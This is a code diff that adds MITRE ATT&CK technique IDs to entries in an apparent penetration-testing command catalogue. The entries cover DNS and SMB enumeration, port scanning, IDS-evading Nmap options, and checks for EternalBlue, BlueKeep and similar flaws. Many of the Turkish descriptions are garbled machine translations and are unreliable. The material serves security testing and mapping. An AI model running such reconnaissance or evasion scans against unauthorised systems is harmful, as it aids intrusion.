@@ -16,7 +16,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Alan adı kayıt bilgileri için WHOIS sorgula"
+            "desc_tr": "Alan adı kayıt bilgileri için WHOIS sorgula",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "WHOIS IP Lookup",
@@ -25,7 +28,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "IP adresi sahiplik ve ağ bloku bilgisi için WHOIS sorgula"
+            "desc_tr": "IP adresi sahiplik ve ağ bloku bilgisi için WHOIS sorgula",
+            "attack": [
+              "T1016",
+              "T1590.002"
+            ]
           },
           {
             "title": "DNS A Record Lookup",
@@ -34,7 +41,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "dig ile alan adını IPv4 adresine çözümle"
+            "desc_tr": "dig ile alan adını IPv4 adresine çözümle",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "DNS MX Record Lookup",
@@ -43,7 +53,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Mail exchange (MX) sunucularını listele"
+            "desc_tr": "Mail exchange (MX) sunucularını listele",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "DNS NS Record Lookup",
@@ -52,7 +65,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Yetkili isim sunucularını (NS) listele"
+            "desc_tr": "Yetkili isim sunucularını (NS) listele",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "DNS TXT Records",
@@ -61,7 +77,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "TXT kayıtlarını al (SPF, DKIM, DMARC)"
+            "desc_tr": "TXT kayıtlarını al (SPF, DKIM, DMARC)",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "DNS ANY Records",
@@ -70,7 +89,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Tüm DNS kayıt türlerini tek seferde sorgula"
+            "desc_tr": "Tüm DNS kayıt türlerini tek seferde sorgula",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "DNS Zone Transfer Attempt",
@@ -79,7 +101,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "İsim sunucusundan AXFR zone transferi dene"
+            "desc_tr": "İsim sunucusundan AXFR zone transferi dene",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Host DNS Lookup",
@@ -107,7 +132,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Otomatik DNS listeleme multiple record types ile"
+            "desc_tr": "Otomatik DNS listeleme multiple record types ile",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "DNSRecon Zone Transfer",
@@ -117,7 +145,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "dnsrecon ile zone transfer dene"
+            "desc_tr": "dnsrecon ile zone transfer dene",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "DNSRecon Brute Force",
@@ -126,7 +157,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı subdomains kelime listesi ile"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı subdomains kelime listesi ile",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "DNSEnum Full Enumeration",
@@ -135,7 +169,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kapsamlı DNS listeleme zone transferi and kaba kuvvet saldırısı ile"
+            "desc_tr": "Kapsamlı DNS listeleme zone transferi and kaba kuvvet saldırısı ile",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Sublist3r Subdomain Enum",
@@ -144,7 +181,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Arama motorları ve açık kaynaklarla alt alan adlarını keşfet"
+            "desc_tr": "Arama motorları ve açık kaynaklarla alt alan adlarını keşfet",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Amass Passive Enum",
@@ -153,7 +193,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Pasif alt alan adı keşfi Amass ile"
+            "desc_tr": "Pasif alt alan adı keşfi Amass ile",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Amass Active Enum",
@@ -163,7 +206,10 @@ module.exports = [
               "tool",
               "advanced"
             ],
-            "desc_tr": "Aktif alt alan adı keşfi kaba kuvvet saldırısı ile"
+            "desc_tr": "Aktif alt alan adı keşfi kaba kuvvet saldırısı ile",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "theHarvester Email & Subdomain Enum",
@@ -172,7 +218,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Açık kaynaklardan e-posta, alt alan adı ve host topla"
+            "desc_tr": "Açık kaynaklardan e-posta, alt alan adı ve host topla",
+            "attack": [
+              "T1589.002"
+            ]
           },
           {
             "title": "Shodan Host Info",
@@ -181,7 +230,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Hedef IP bilgisi için Shodan'ı sorgula"
+            "desc_tr": "Hedef IP bilgisi için Shodan'ı sorgula",
+            "attack": [
+              "T1596"
+            ]
           },
           {
             "title": "Shodan Domain Search",
@@ -190,7 +242,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Bir alan adıyla ilişkili hostlar için Shodan'da ara"
+            "desc_tr": "Bir alan adıyla ilişkili hostlar için Shodan'da ara",
+            "attack": [
+              "T1596"
+            ]
           },
           {
             "title": "Google Dork - Site Files",
@@ -259,7 +314,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "WHOIS, netcraft, alt alan adı, e-posta ve port bilgisi topla"
+            "desc_tr": "WHOIS, netcraft, alt alan adı, e-posta ve port bilgisi topla",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Fierce DNS Recon",
@@ -268,7 +326,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "DNS keşif and subdomakaba kuvvet saldırısı içinde"
+            "desc_tr": "DNS keşif and subdomakaba kuvvet saldırısı içinde",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Dig Reverse DNS Lookup",
@@ -277,7 +338,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "ters DNS çözümleme dig üzerinden"
+            "desc_tr": "ters DNS çözümleme dig üzerinden",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Dig Short Answer",
@@ -286,7 +350,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "dig'den yalnızca cevap (answer) bölümünü al"
+            "desc_tr": "dig'den yalnızca cevap (answer) bölümünü al",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Dig AAAA (IPv6) Record",
@@ -295,7 +362,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "IPv6 AAAA kayıtlarını sorgula"
+            "desc_tr": "IPv6 AAAA kayıtlarını sorgula",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Dig SRV Records",
@@ -304,7 +374,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Servis keşfi için SRV kayıtlarını sorgula"
+            "desc_tr": "Servis keşfi için SRV kayıtlarını sorgula",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Dig with Specific DNS Server",
@@ -313,7 +386,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Belirli bir DNS sunucusunu sorgula"
+            "desc_tr": "Belirli bir DNS sunucusunu sorgula",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Nslookup Interactive",
@@ -327,7 +403,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Interactive DNS queries nslookup ile"
+            "desc_tr": "Interactive DNS queries nslookup ile",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Nslookup Reverse Lookup",
@@ -336,7 +415,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "ters DNS çözümleme nslookup ile"
+            "desc_tr": "ters DNS çözümleme nslookup ile",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Traceroute to Target",
@@ -364,7 +446,10 @@ module.exports = [
               "essential"
             ],
             "note": "Replace <SUBNET> with the first three octets",
-            "desc_tr": "Hızlı ping sweep bash for loop kullanarak"
+            "desc_tr": "Hızlı ping sweep bash for loop kullanarak",
+            "attack": [
+              "T1018"
+            ]
           },
           {
             "title": "Ping Sweep (Nmap)",
@@ -373,7 +458,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Ping sweep Nmap ARP discovery ile"
+            "desc_tr": "Ping sweep Nmap ARP discovery ile",
+            "attack": [
+              "T1046",
+              "T1018"
+            ]
           },
           {
             "title": "NBTScan Subnet Scan",
@@ -400,7 +489,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Resolve domain"
+            "desc_tr": "Resolve domain",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "nslookup Reverse",
@@ -409,7 +501,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Ters DNS sorgusu"
+            "desc_tr": "Ters DNS sorgusu",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "nslookup Server",
@@ -418,7 +513,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Query specific DNS server"
+            "desc_tr": "Query specific DNS server",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "nslookup MX",
@@ -427,7 +525,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Query MX records"
+            "desc_tr": "Query MX records",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "Waybackurls",
@@ -496,7 +597,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Hızlı SYN tarama tüm portlar — the default go-tarama üzerinde'e"
+            "desc_tr": "Hızlı SYN tarama tüm portlar — the default go-tarama üzerinde'e",
+            "attack": [
+              "T1046",
+              "T1049"
+            ]
           },
           {
             "title": "Nmap TCP Connect Scan",
@@ -505,7 +610,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Tam TCP handshake tarama — use when SYN tarama is not available"
+            "desc_tr": "Tam TCP handshake tarama — use when SYN tarama is not available",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap UDP Scan (Top Ports)",
@@ -514,7 +622,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Scan top UDP ports for common services"
+            "desc_tr": "Scan top UDP ports for common services",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Quick Top 1000",
@@ -523,7 +634,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Hızlı tarama of default top 1000 TCP ports"
+            "desc_tr": "Hızlı tarama of default top 1000 TCP ports",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Specific Port Scan",
@@ -532,7 +646,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Scan specific ports of interest"
+            "desc_tr": "Scan specific ports of interest",
+            "attack": [
+              "T1046",
+              "T1049"
+            ]
           },
           {
             "title": "Nmap Ping Sweep",
@@ -541,7 +659,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Discover live hosts on a subnet"
+            "desc_tr": "Discover live hosts on a subnet",
+            "attack": [
+              "T1046",
+              "T1018"
+            ]
           },
           {
             "title": "Nmap List Scan",
@@ -550,7 +672,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List targets without scanning (DNS resolution only)"
+            "desc_tr": "List targets without scanning (DNS resolution only)",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Masscan Full Port Scan",
@@ -559,7 +684,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Ultra-fast port taraması tüm TCP ports üzerinde"
+            "desc_tr": "Ultra-fast port taraması tüm TCP ports üzerinde",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Masscan Top Ports",
@@ -568,7 +696,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Hızlı tarama of commports masscan ile üzerinde"
+            "desc_tr": "Hızlı tarama of commports masscan ile üzerinde",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "RustScan Quick Scan",
@@ -577,7 +708,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Lightning-fast port taraması automatic nmap handoff ile"
+            "desc_tr": "Lightning-fast port taraması automatic nmap handoff ile",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "RustScan Specific Ports",
@@ -586,7 +720,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "RustScan belirli port range ile"
+            "desc_tr": "RustScan belirli port range ile",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Traceroute TCP",
@@ -613,7 +750,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Hızlı subnet ping sweep"
+            "desc_tr": "Hızlı subnet ping sweep",
+            "attack": [
+              "T1018"
+            ]
           },
           {
             "title": "Arping Layer 2",
@@ -631,7 +771,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "ARP keşif"
+            "desc_tr": "ARP keşif",
+            "attack": [
+              "T1018"
+            ]
           },
           {
             "title": "Nmap Zombie Scan",
@@ -640,7 +783,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Stealth idle tarama"
+            "desc_tr": "Stealth idle tarama",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Decoy Scan",
@@ -649,7 +795,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Scan with decoy IPs"
+            "desc_tr": "Scan with decoy IPs",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap MAC Spoof",
@@ -658,7 +807,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "MAC adresini taklit et (spoof)"
+            "desc_tr": "MAC adresini taklit et (spoof)",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Fragment",
@@ -667,7 +819,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Atlatma için paketleri parçala (fragment)"
+            "desc_tr": "Atlatma için paketleri parçala (fragment)",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Data Length",
@@ -676,7 +831,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Add padding to evade IDS"
+            "desc_tr": "Add padding to evade IDS",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Bash Ping Sweep",
@@ -685,7 +843,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Hızlı subnet sweep"
+            "desc_tr": "Hızlı subnet sweep",
+            "attack": [
+              "T1018"
+            ]
           },
           {
             "title": "Nmap All Ports (Rate 1000)",
@@ -694,7 +855,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Scan all ports at moderate speed — good for unstable networks"
+            "desc_tr": "Scan all ports at moderate speed — good for unstable networks",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap All Ports (Rate 3000, No Ping)",
@@ -703,7 +867,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Hızlı full port taraması skipping aktif host keşfi"
+            "desc_tr": "Hızlı full port taraması skipping aktif host keşfi",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap UDP Top 100",
@@ -712,7 +879,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Hızlı UDP tarama of the 100 most commports üzerinde"
+            "desc_tr": "Hızlı UDP tarama of the 100 most commports üzerinde",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Aggressive Full Scan",
@@ -721,7 +891,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Versidetection on tüm portlar maximum speed ile üzerinde"
+            "desc_tr": "Versidetection on tüm portlar maximum speed ile üzerinde",
+            "attack": [
+              "T1046"
+            ]
           }
         ],
         "name_tr": "Active Port Scanning"
@@ -736,7 +909,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Probe open ports for service versions on discovered ports"
+            "desc_tr": "Probe open ports for service versions on discovered ports",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Aggressive Scan",
@@ -745,7 +921,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "İşletim sistemi tespiti, versiyon, scriptler ve traceroute"
+            "desc_tr": "İşletim sistemi tespiti, versiyon, scriptler ve traceroute",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap OS Detection",
@@ -754,7 +933,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Attempt operating system fingerprinting"
+            "desc_tr": "Attempt operating system fingerprinting",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Default Scripts",
@@ -763,7 +945,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Run default NSE script suite against services"
+            "desc_tr": "Run default NSE script suite against services",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap All Scripts Safe",
@@ -772,7 +957,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Run all safe-category NSE scripts"
+            "desc_tr": "Run all safe-category NSE scripts",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Vulnerability Scripts",
@@ -781,7 +969,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Run vulnerability scanning scripts"
+            "desc_tr": "Run vulnerability scanning scripts",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Script Category Run",
@@ -790,7 +981,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Run specific NSE script categories"
+            "desc_tr": "Run specific NSE script categories",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Netcat Banner Grab",
@@ -808,7 +1002,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Grab service banners NSE üzerinden"
+            "desc_tr": "Grab service banners NSE üzerinden",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Version Intensity Max",
@@ -817,7 +1014,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Maximum versidetection intensity üzerinde"
+            "desc_tr": "Maximum versidetection intensity üzerinde",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap HTTP Enum",
@@ -826,7 +1026,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate web directories"
+            "desc_tr": "Enumerate web directories",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap DNS Brute",
@@ -835,7 +1038,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı subdomains"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı subdomains",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap FTP Anon",
@@ -844,7 +1050,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: anonymous FTP"
+            "desc_tr": "Kontrol et: anonymous FTP",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap MySQL Info",
@@ -853,7 +1062,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate MySQL"
+            "desc_tr": "Enumerate MySQL",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap MSSQL Info",
@@ -862,7 +1074,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate MSSQL"
+            "desc_tr": "Enumerate MSSQL",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap RDP Info",
@@ -871,7 +1086,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Extract RDP hostname/domain"
+            "desc_tr": "Extract RDP hostname/domain",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap VNC Info",
@@ -880,7 +1098,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Enumerate VNC"
+            "desc_tr": "Enumerate VNC",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Redis Info",
@@ -889,7 +1110,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Get Redis info"
+            "desc_tr": "Get Redis info",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap MongoDB",
@@ -898,7 +1122,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Enumerate MongoDB"
+            "desc_tr": "Enumerate MongoDB",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap NFS Shares",
@@ -907,7 +1134,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List NFS exports"
+            "desc_tr": "List NFS exports",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "RPCinfo",
@@ -941,7 +1171,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Enumerate SMB shares, users, groups, policies"
+            "desc_tr": "Enumerate SMB shares, users, groups, policies",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "Enum4linux-ng Full Scan",
@@ -950,7 +1183,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Modern Pythrewrite JSON output ile üzerinde"
+            "desc_tr": "Modern Pythrewrite JSON output ile üzerinde",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "SMBClient List Shares (Null)",
@@ -959,7 +1195,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List SMB shares with null session"
+            "desc_tr": "List SMB shares with null session",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "SMBClient Connect to Share",
@@ -987,7 +1226,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Paylaşımları ve izinleri listele"
+            "desc_tr": "Paylaşımları ve izinleri listele",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "SMBMap Authenticated",
@@ -997,7 +1239,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Enumerate shares with credentials"
+            "desc_tr": "Enumerate shares with credentials",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "SMBMap Recursive Listing",
@@ -1006,7 +1251,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Recursively list files a share içinde"
+            "desc_tr": "Recursively list files a share içinde",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "SMBMap Download File",
@@ -1015,7 +1263,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Download a file from a share"
+            "desc_tr": "Download a file from a share",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "CrackMapExec SMB Enum",
@@ -1034,7 +1285,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "List shares with credentials"
+            "desc_tr": "List shares with credentials",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "CrackMapExec SMB Users",
@@ -1061,7 +1315,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate SMB shares via NSE"
+            "desc_tr": "Enumerate SMB shares via NSE",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap SMB Enum Users",
@@ -1070,7 +1327,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate SMB users via NSE"
+            "desc_tr": "Enumerate SMB users via NSE",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap SMB OS Discovery",
@@ -1079,7 +1339,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Discover OS via SMB"
+            "desc_tr": "Discover OS via SMB",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap SMB Vuln Scan",
@@ -1088,7 +1351,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: for known SMB zafiyet(ler)"
+            "desc_tr": "Kontrol et: for known SMB zafiyet(ler)",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "NBTScan NetBIOS Enum",
@@ -1124,7 +1390,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Next-gen SMB listeleme"
+            "desc_tr": "Next-gen SMB listeleme",
+            "attack": [
+              "T1135"
+            ]
           }
         ],
         "name_tr": "SMB & NetBIOS Probing"
@@ -1292,7 +1561,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate domain users via RPC"
+            "desc_tr": "Enumerate domain users via RPC",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "RPCClient Enum Domain Groups",
@@ -1301,7 +1573,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate domain groups via RPC"
+            "desc_tr": "Enumerate domain groups via RPC",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "RPCClient Query User",
@@ -1552,7 +1827,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Grab web page titles nmap NSE üzerinden"
+            "desc_tr": "Grab web page titles nmap NSE üzerinden",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap HTTP Headers",
@@ -1561,7 +1839,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Extract HTTP headers via nmap NSE"
+            "desc_tr": "Extract HTTP headers via nmap NSE",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Curl CORS Test",
@@ -1631,7 +1912,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Run all vuln-category NSE scripts"
+            "desc_tr": "Run all vuln-category NSE scripts",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap MS17-010 (EternalBlue)",
@@ -1640,7 +1924,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: for EternalBlue SMB zafiyet(ler)"
+            "desc_tr": "Kontrol et: for EternalBlue SMB zafiyet(ler)",
+            "attack": [
+              "T1046",
+              "T1210"
+            ]
           },
           {
             "title": "Nmap MS08-067 (Conficker)",
@@ -1649,7 +1937,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: for MS08-067 NetAPI zafiyet(ler)"
+            "desc_tr": "Kontrol et: for MS08-067 NetAPI zafiyet(ler)",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Heartbleed Check",
@@ -1658,7 +1949,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Test et: for OpenSSL Heartbleed zafiyet(ler)"
+            "desc_tr": "Test et: for OpenSSL Heartbleed zafiyet(ler)",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap Shellshock Check",
@@ -1667,7 +1961,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Test et: for Bash Shellshock zafiyet(ler)"
+            "desc_tr": "Test et: for Bash Shellshock zafiyet(ler)",
+            "attack": [
+              "T1046",
+              "T1190"
+            ]
           },
           {
             "title": "Nmap SMB Vuln Scan All",
@@ -1676,7 +1974,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: for tüm SMB zafiyet(ler)"
+            "desc_tr": "Kontrol et: for tüm SMB zafiyet(ler)",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap FTP Anonymous Check",
@@ -1685,7 +1986,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: for anonymous FTP login"
+            "desc_tr": "Kontrol et: for anonymous FTP login",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap HTTP Methods Check",
@@ -1694,7 +1998,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate allowed HTTP methods (PUT, DELETE)"
+            "desc_tr": "Enumerate allowed HTTP methods (PUT, DELETE)",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap HTTP Robots Check",
@@ -1703,7 +2010,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Retrieve and display robots.txt"
+            "desc_tr": "Retrieve and display robots.txt",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap HTTP Enum",
@@ -1712,7 +2022,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate common web directories and files"
+            "desc_tr": "Enumerate common web directories and files",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Nmap RDP Bluekeep Check",
@@ -1721,7 +2034,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Kontrol et: for CVE-2019-0708 BlueKeep"
+            "desc_tr": "Kontrol et: for CVE-2019-0708 BlueKeep",
+            "attack": [
+              "T1046",
+              "T1210"
+            ]
           },
           {
             "title": "SSLScan Full Analysis",
